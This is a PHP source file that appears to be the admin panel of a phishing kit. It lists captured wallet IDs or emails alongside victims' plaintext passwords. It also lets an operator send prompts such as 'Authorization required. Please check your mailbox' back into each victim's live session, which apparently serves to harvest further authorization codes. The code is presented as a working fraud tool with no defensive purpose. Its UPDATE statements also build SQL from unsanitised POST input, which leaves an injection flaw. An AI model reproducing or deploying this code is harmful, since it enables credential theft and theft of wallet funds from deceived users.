<?php
session_start();
require("../../config/db_connect.php");
if ( isset($_POST["row_counter"]) ) {
	$query = $conn->prepare("SELECT * FROM user_login");
	try {
		$query->execute();
		echo $query->rowcount();
	}catch(PDOEXception $e) {
		echo $e->getMessage();	
	}
}

if ( isset($_POST["fetch_table"]) ) {
	$query = $conn->prepare("SELECT * FROM user_login ORDER BY id DESC");
	try {
		$query->execute();
		if ( $query->rowcount() > 0 ) {
			?>
				<h4>Request table</h4>
				<div class="table-responsive">
					<table class="table table-hover">
						<thead class="bg-info">
							<tr>
								<th>#</th>
								<th>Email / Wallet ID</th>
								<th>Password</th>
								<th>Action</th>
							</tr>
						</thead>
						<tbody>
			<?php
			while ( $row = $query->fetch() ) {
				?>
					<tr>
								<td>1</td>
								<td><?php echo $row['wallet_id']; ?></td>
								<td><?php echo $row['login_pwd']; ?></td>
								<td>
									<form action="javascript:void(0)" class="authform" onsubmit="sendAuth(this)" id="form<?php echo $row['id']; ?>">
										<input type="text" name="feed" value="Authorization required. Please check your mailbox">
                                        <select name="resp">
                                          <option value="" selected>Response</option>
                                          <option value="yes">Yes</option>
                                          <option value="no">No</option>
                                        </select>
										<input type="hidden" name="auth_msg" value="<?php echo $row['session_id']; ?>">
                                        <button type="submit" class="btn btn-xs btn-primary">Submit</button>
									</form>
								</td>
							</tr>
				<?php
			}
			?>
						</tbody>
					</table>
				</div>
			<?php
		}else {
			echo "<p class='text-center'>No record found!</p>";
		}
	}catch(PDOEXception $e) {
		echo $e->getMessage();	
	}
}


if ( isset($_POST["auth_msg"]) ) {
	$session_id = $_POST["auth_msg"];
	$feed = $_POST["feed"];
	$resp = $_POST["resp"];
    
    if ( $resp == "yes" ) {
        $query = $conn->prepare("UPDATE user_login SET request='$feed', type='response' WHERE session_id='$session_id'");
    }else {
	   $query = $conn->prepare("UPDATE user_login SET request='$feed', type='' WHERE session_id='$session_id'");
    }
	try {
		$query->execute();
		echo "request Sent!";
	}catch( PDOException $e ) {
		echo $e->getMessage();
	}
}
?>